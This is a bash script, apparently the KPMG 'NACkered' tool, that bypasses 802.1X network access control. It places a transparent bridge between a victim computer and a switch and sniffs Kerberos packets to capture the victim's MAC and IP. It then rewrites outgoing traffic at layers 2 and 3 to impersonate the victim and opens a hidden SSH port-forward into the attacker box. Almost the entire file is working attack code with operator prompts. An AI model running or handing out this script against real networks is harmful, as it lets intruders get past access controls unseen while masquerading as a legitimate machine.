#!/bin/bash

## --
## Original Script:
## Matt E - NACkered v2.92.2 - KPMG LLP 2014
## KPMG UK Cyber Defence Services
## --

if [ "$1" == "-h" ] ; then
	echo -e "Info: `basename $0`\n\n[-h or --help]\t\t+Display this help information\n[-v or --version]\t+Display version information\n[-a or --about]\t\t+Display usage information"
	exit 0
fi
if [ "$1" == "-v" ] ; then
	echo -e "Version: `basename $0` 2.92 Automatic\nMatt E\nKPMG LLP 2014"
	exit 0
fi
if [ "$1" == "--version" ] ; then
	echo -e "Version: `basename $0` 2.92 Automatic\nMatt E\nKPMG LLP 2014"
	exit 0
fi
if [ "$1" == "--help" ] ; then
	echo -e "Info: `basename $0`\n\n[-h or --help]\t\t+Display this help information\n[-v or --version]\t+Display version information\n[-a or --about]\t\t+Display usage information"
	exit 0
fi
if [ "$1" == "-a" ] ; then
	echo -e "Insert Info about script here"
	exit 0
fi
if [ "$1" == "--about" ] ; then
	echo -e "Insert info about script here"
	exit 0
fi
service network-manager stop
echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
sysctl -p
echo "" > /etc/resolv.conf
read -p "Ground work done, Press any key..." -n1 -s
echo

###### THIS BLOCK IS REDUDANT AS THESE VARIABLES ARE AUTOMAGICALLY OBTAINED######
#SWMAC=		#MAC OF TO SWITCH eth1
#NEED TO OBTAIN FORM A VICTIM
#COMPMAC=
#COMIP=
#GWNET=
#DEFGW=
###### THIS BLOCK IS REDUDANT AS THESE VARIABLES ARE AUTOMAGICALLY OBTAINED######

BRINT=br0 #bridge interface
ININT=eth0 #interface of laptop to kill (we prefer to use two usb2eth's)
SWINT=eth1 #interface of usb2eth plugged into switch
SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'` #get SWINT MAC address automatically.
COMPINT=eth2 #interface of usb2eth plugged into victim machine
BRIP=169.254.66.66 #IP for the bridge
DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
RANGE=61000-62000 #Ports for my traffic on NAT

echo 
read -p "Loaded in Variables, Press any key..." -n1 -s
echo 

ifconfig $ININT down #Disconnect inbuilt Ethernet Ports (Only use USB2ethernet)	

echo 
read -p "Killed internal LAN, Press any key..." -n1 -s
echo 
 
brctl addbr $BRINT #Make bridge
brctl addif $BRINT $COMPINT #add computer side to bridge
brctl addif $BRINT $SWINT #add switch side to bridge

echo 8 > /sys/class/net/br0/bridge/group_fwd_mask #forward EAP packets
echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

ifconfig $COMPINT 0.0.0.0 up promisc #bring up comp interface
ifconfig $SWINT 0.0.0.0 up promisc #bring up switch interface

echo 
read -p "Bridge Configured, Press any key..." -n1 -s
echo 

macchanger -m 00:12:34:56:78:90 $BRINT #Swap MAC of bridge to an initialisation value (not important what)
macchanger -m $SWMAC $BRINT #Swap MAC of bridge to the switch side MAC

echo "Bringing up the Bridge"				
ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE

#VICTIM MACHINE SHOULD WORK OK AT THIS POINT (if not badtimes - run!!)

echo 
read -p "Bridge up, should be dark, Connect Ethernet cables to adatapers and leave to steady (watch the lights make sure they don't go out!) Wait for 30seconds then press any key..." -n1 -s
echo 

echo "Resetting Connection"
mii-tool -r $COMPINT
mii-tool -r $SWINT

echo "Listening for Traffic"
tcpdump -i $COMPINT -s0 -w /boot.pcap -c1 tcp dst port 88 #We pcap any kerberos traffic should be some in Windows land
echo

echo "Processing packet and setting veriables COMPMAC GWMAC COMIP"
COMPMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
GWMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
COMIP=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port 88 | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`

echo "Going Silent"
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

echo "Bringing up interface with bridge side IP"
ifconfig $BRINT $BRIP up promisc

# Anything leaving this box with the switch side MAC on the switch interface or bridge interface rewrite and give it the victims MAC
echo "Setting up Layer 2 rewrite"
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

#Create default routes so we can route traffic - all traffic goes to 169.254.66.1 and this traffic gets Layer 2 sent to GWMAC
echo "Adding default routes"
arp -s -i $BRINT 169.254.66.1 $GWMAC
route add default gw 169.254.66.1

#SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on 22 (SSH)
echo "Setting up SSH reverse shell inbound on BICTIMIP:2222 to ATTACKERIP:22"
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

echo 
read -p "Setting up Layer 3 rewrite rules" -n1 -s
echo 

#Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

echo 
read -p "Start local SSH server" -n1 -s
echo 

#START SSH
/etc/init.d/ssh start

echo 
read -p "All setup steps complete; check ports are still lit and operational" -n1 -s
echo 

echo "Re-enabling traffic flow; monitor ports for lockout"
#Re-enable L2 and L3
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP

echo "Time for fun & profit"
